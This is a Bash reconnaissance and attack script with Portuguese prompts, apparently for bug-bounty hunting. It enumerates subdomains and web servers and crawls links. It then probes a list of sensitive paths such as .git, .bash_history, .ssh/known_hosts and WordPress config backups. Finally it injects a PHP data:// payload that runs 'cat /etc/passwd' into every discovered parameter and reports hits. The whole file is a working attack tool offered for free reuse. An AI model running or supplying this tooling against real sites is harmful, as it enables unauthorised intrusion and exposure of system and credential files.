#!/bin/bash

#https://hackerone.com/reports/779656

git_array=('/.git' '/.git-rewrite' '/.git/HEAD' '/.git/index' '/.git/logs' '/.gitattributes' '/.gitconfig' '/.gitkeep' '/.gitmodules' '/.gitreview' '/.svn/entries' '/.svnignore' '/.svn/wc.db' '/.git/config' '/.travis.yml' '/.htaccess' '/.bash_history' '/.ssh/known_hosts')
wp_array=('/wp-includes' '/index.php' '/wp-login.php' '/wp-links-opml.php' '/wp-activate.php' '/wp-blog-header.php' '/wp-cron.php' '/wp-links.php' '/wp-mail.php' '/xmlrpc.php' '/wp-settings.php' '/wp-trackback.php' '/wp-admin/setup-config.php?step=1' '/wp-content/plugins/supportboard/supportboard/include/ajax.php' '/wp_inc/' '/wp-config.php.bkp' '/wp-admin/install.php' '/wp-content/plugins/wp-statistics/readme.txt' '/themes/search' '/wp-json/') 
#/wp-admin/login.php
#/wp-admin/wp-login.php
#license.txt

echo -e "\e[1;32m██████╗ ██╗██╗  ██╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗██████╗ ██████╗     ██╗   ██╗   ██████╗    ██████╗" 
echo "██╔══██╗██║██║  ██║██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝╚════██╗██╔══██╗    ██║   ██║  ██╔═████╗   ╚════██╗"
echo "██████╔╝██║███████║██║  ██║███████║██║   ██║██╔██╗ ██║   ██║    █████╔╝██████╔╝    ██║   ██║  ██║██╔██║    █████╔╝"
echo "██╔══██╗██║╚════██║██║  ██║██╔══██║██║   ██║██║╚██╗██║   ██║    ╚═══██╗██╔══██╗    ╚██╗ ██╔╝  ████╔╝██║   ██╔═══╝ "
echo "██████╔╝███████╗██║██████╔╝██║  ██║╚██████╔╝██║ ╚████║   ██║   ██████╔╝██║  ██║     ╚████╔╝██╗╚██████╔╝██╗███████╗"
echo -e "╚═════╝ ╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝      ╚═══╝ ╚═╝ ╚═════╝ ╚═╝╚══════╝\e[0m"

echo -e "Creditos: Bl4dSc4n\e[0m"
echo -e "\e[1;20;50mLivre uso e modificação, mantenha os creditos em comentario.\e[0m"
echo -e "\e[1;31;50mPs: Não façam teste em dominios sem permissão\e[0m"
echo -e "\e[10;32mDigite o dominio\e[0m"
read dominio
mkdir $dominio
cd $dominio

#printf '%s\n'  ${git_array[@]} #> git.txt
#printf '%s\n'  ${wp_array[@]} #> wp.txt

echo -e "\e[1;33;40mEscolha a Opção de Recon\e[0m"
echo -e "Procurar dominio Unico = U // Subdominios = S // Sub-Sub = SS\e[0m"

read -n2 -p 'Opção: ' opcao 
if [ $opcao == "U" ];
then
    echo -e "\e[1;32mProcurando Dominio Unico\e[0m"
    echo $dominio  > sub4-$dominio

elif [ $opcao == "S" ];
then
    echo -e "\e[1;32mProcurando Dominios e Subdominios\e[0m"
    subfinder -d $dominio -silent -o sub4-$dominio
    
elif [ $opcao == "SS" ];
then
    echo -e "\e[1;32mProcurando Dominios, Sub-sub \e[0m"
    findomain -q -t $dominio | tee sub-$dominio
    echo $dominio >> sub-$dominio
    subfinder -max-time 5 -timeout 10 -dL sub-$dominio -silent -o sub1-$dominio
    cat sub1-$dominio >> sub-$dominio; cat sub-$dominio | sort -u | tee -a sub4-$dominio
    rm -rf sub-$dominio sub1-$dominio

fi

echo -e "\e[1;32mProcurando Servidores Web\e[0m"
echo ""
cat sub4-$dominio | httpx -silent -title -tech-detect -random-agent -cdn -cname | tee sub2-$dominio

echo -e "\e[1;32m Procurando Tecnologias usadas\e[0m"
for r in $(awk '{print $1}' sub2-$dominio);do wappy -u $r;done | tee -a Tecnologias-$dominio 

echo -e "\e[1;32m Procurando Links\e[0m"
echo ""
awk '{print $1}' sub2-$dominio | gauplus --random-agent | tee -a links-$dominio 
echo -e "\e[1;32m Extraindo os Heads\e[0m"
for i in $(awk '{print $1}' sub2-$dominio);do echo $i; curl -X OPTIONS $i -I -s -H "user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0";done | tee -a HTTP-HEADS.TXT
echo -e "\e[1;32m Crawl de Profundidade\e[0m"
echo ""

#########################
# Parsh web : creditos Desec Security, apenas modifiquei.
for u in $(awk '{print $1}' sub2-$dominio  | cut -d "/" -f 3);do 
    wget -q -c $u -O $u 

# Filtrando links
#echo "Quebranco as linhas para melhorar a seleÃ§Ã£o dos links, onde se encontram as palavras 'href' e 'action'."
    sed -i "s/ /\n/g" $u
    grep -E "(href=|action=|src=|srcset=)" $u > .tmp1-$u

#echo "Capturando o conteudo entre aspas e apostrofos."
    grep -oh '"[^"]*"' .tmp1-$u > .tmp2-$u
    grep -oh "'[^']*'" .tmp1-$u >> .tmp2-$u

#echo "Removendo as aspas e apostrofos."
    sed -i 's/"//g' .tmp2-$u
    sed -i "s/'//g" .tmp2-$u

#echo "Captura apenas as linhas que contenham pontos, e remove as semelhantes."
    grep "\." .tmp2-$u | sort -u | tee -a links4-$u
done

##########################

echo -e "\e[1;32m Verificando status dos links\e[0m"
httpx -silent -status-code -random-agent -threads 50 -content-length -l links-$dominio  | tee -a code_achados.txt

echo -e "\e[1;32m Localizando Json\e[0m"
cat  code_achados.txt | grep "200" | awk '/\.js|\.json/ {print $1}' | tee -a json_files
echo -e "\e[1;32m Localizando Parametros\e[0m"
cat code_achados.txt | egrep "200|403|500" | egrep -v "\.ttf|\.woff|\.svg|\.gif|\.woff2|.\ico|.eot" | awk '/=/ {print $1}' | tee -a parametros_files
echo -e "\e[1;32m Localizados links ativos\e[0m"
cat code_achados.txt | egrep "200|403|500" |  awk '/=/ {print $1}' | tee -a todos_files

### Teste em WordPress ??
read -n2 -p 'Teste em WordPress? S ou N: ' opcao1

if [ $opcao1 == "N" ];
then
   echo -e "\e[1;32mProcurando Git Explosed\e[0m"
   for o in $(printf '%s\n' ${git_array[@]});do cat sub4-$dominio | httpx -silent -threads 100 -paths $o -title -status-code;done

elif [ $opcao1 == "S" ];
then
   echo -e "\e[1;32mProcurando Arquivos Sensiveis Wordpress & Git Explosed\e[0m"
   for h in $((printf '%s\n' ${git_array[@]} ${wp_array[@]});do cat sub4-$dominio | httpx -silent -threads 100 -paths $h -title -status-code;done

fi

####### Baixando e Analisando arquivos e Vuln
echo -e "\e[1;32m Baixandos arquivos json\e[0m"
for f in $(cat json_files);do wget $f -q 2>/dev/null;done 
fdupes -N -d . 1>/dev/null
echo -e "\e[1;32m Analisando Arquivos Json\e[0m"
retire -j --colors | tee -a vulnerabilidades2-js 
echo -e "\e[1;32m Injetando Comando\e[0m"
cat parametros_files | uro | qsreplace "data://text/plan,%3c?php%20system('cat%20/etc/passwd')%20?%3e" > injetando.txt
for a in $(cat injetando.txt);do curl -s -q -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" $a | grep -q "root:x"&&echo -e "VULN: $a";done  
echo -e "\e[33;32m Fim do Recon\e[0m"
